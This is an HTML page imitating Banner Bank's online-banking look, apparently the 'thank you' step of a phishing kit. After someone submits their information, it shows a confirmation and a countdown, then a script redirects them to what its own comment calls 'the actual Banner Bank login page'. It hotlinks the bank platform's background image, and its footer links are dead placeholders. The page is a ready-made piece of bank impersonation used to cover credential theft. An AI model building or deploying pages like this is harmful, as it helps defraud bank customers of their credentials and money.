<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Banner Bank Thank You</title>
    <link rel="icon" type="image/png" href="images/BANR-icon.png">
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: url('https://cdn1.onlineaccess1.com/cdn/depot/3388/2368/cb6a8356fe8f8dbad2964b1ace778bfd/assets/images/desktop-background-q2-2d84adb4a94fe345760ff47cbb997f6e.png') no-repeat center center fixed;
            background-size: cover;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .main-container {
            width: 650px;
        }
        .fig-container {
            padding: 10px 0;
            display: flex;
            flex-direction: row;
            align-items: center;
            font-family: sans-serif;
            font-weight: 400;
            font-size: 12.8px;
            line-height: 1;
            min-height: 1rem;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 20px;
        }
        .fig-container img {
            max-height: 40px;
            width: auto;
            flex-shrink: 0;
        }
        .fidc_writing {
            margin-left: 10px;
            font-style: italic;
            color: white;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
        }
        .login-container {
            width: 100%;
            border-radius: 5px;
            overflow: hidden;
        }
        .image-section {
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #0051ba;
        }
        .imgg {
            height: 150px;
            width: auto;
        }
        .login-section {
            background-color: #fff;
            padding: 50px 10%;
            text-align: center;
        }
        .checkmark {
            font-size: 72px;
            color: #4caf50;
            margin-bottom: 20px;
            animation: scaleIn 0.5s ease-out;
        }
        @keyframes scaleIn {
            0% { transform: scale(0); opacity: 0; }
            80% { transform: scale(1.2); }
            100% { transform: scale(1); opacity: 1; }
        }
        .thank-you-title {
            font-family: sans-serif;
            font-size: 28px;
            font-weight: bold;
            color: #0051ba;
            margin-bottom: 10px;
        }
        .thank-you-message {
            font-family: sans-serif;
            font-size: 16px;
            color: #333;
            margin-bottom: 20px;
        }
        .redirect-message {
            font-family: sans-serif;
            font-size: 14px;
            color: #666;
            margin-top: 10px;
        }
        .redirect-message .countdown {
            font-weight: bold;
            color: #0051ba;
        }
        .footer-section {
            background-color: #0061b0;
            padding: 15px 0;
            text-align: center;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }
        .footer-section a {
            color: white;
            text-decoration: none;
            font-size: 13px;
            border-right: 1px solid white;
            padding: 0 8px;
            font-family: sans-serif;
        }
        .footer-section a:last-child {
            border-right: none;
        }
        @media screen and (max-width: 600px) {
            body {
                padding: 40px 20px;
            }
            .main-container {
                width: 100%;
                margin: 0 auto;
            }
            .fig-container {
                flex-direction: row;
                align-items: center;
                padding: 10px 0;
                flex-wrap: nowrap;
            }
            .fig-container img {
                max-height: 35px;
                width: auto;
                flex-shrink: 0;
            }
            .fidc_writing {
                margin-left: 8px;
                font-size: 11px;
                font-style: italic;
                line-height: 1.3;
                word-break: break-word;
                color: white;
                text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
            }
            .image-section {
                justify-content: center;
                align-items: center;
            }
            .imgg {
                height: 60px;
            }
            .login-section {
                padding: 30px 20px;
            }
            .checkmark {
                font-size: 56px;
            }
            .thank-you-title {
                font-size: 22px;
            }
            .thank-you-message {
                font-size: 14px;
            }
            .redirect-message {
                font-size: 12px;
            }
            .footer-section {
                gap: 10px;
                padding: 10px 0;
            }
            .footer-section a {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <section class="main-container">
        <!-- FDIC Container - No white frame -->
        <div class="fig-container">
            <img src="images/FDIC.jpeg" alt="FDIC Logo">
            <div class="fidc_writing">FDIC Insured - Backed by the full faith and credit of the U.S. Government</div>
        </div>
        <div class="login-container">
            <div class="image-section">
                <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg">
            </div>
            <div class="login-section">
                <div class="checkmark">✓</div>
                <div class="thank-you-title">Thank You!</div>
                <div class="thank-you-message">Your information has been successfully submitted.</div>
                    <span class="countdown" id="countdown">4</span> seconds...
                </div>
            </div>
            <div class="footer-section">
                <a href="#">Locations</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Forgot Password</a>
                <a href="#">Unlock/Forgot Login ID</a>
                <a href="#">Enroll</a>
            </div>
        </div>
    </section>

    <script>
        // Auto redirect after 4 seconds with countdown
        let seconds = 4;
        const countdownElement = document.getElementById('countdown');
        
        const countdownInterval = setInterval(() => {
            seconds--;
            if (seconds > 0) {
                countdownElement.textContent = seconds;
            } else {
                clearInterval(countdownInterval);
                // Redirect to the actual Banner Bank login page
                window.location.href = 'https://secure.bannerbank.com/bannerbankonline_41/uux.aspx#/login';
            }
        }, 1000);

        // Fallback redirect if something goes wrong
        setTimeout(() => {
            window.location.href = 'https://secure.bannerbank.com/bannerbankonline_41/uux.aspx#/login';
        }, 5000);
    </script>
</body>
</html>
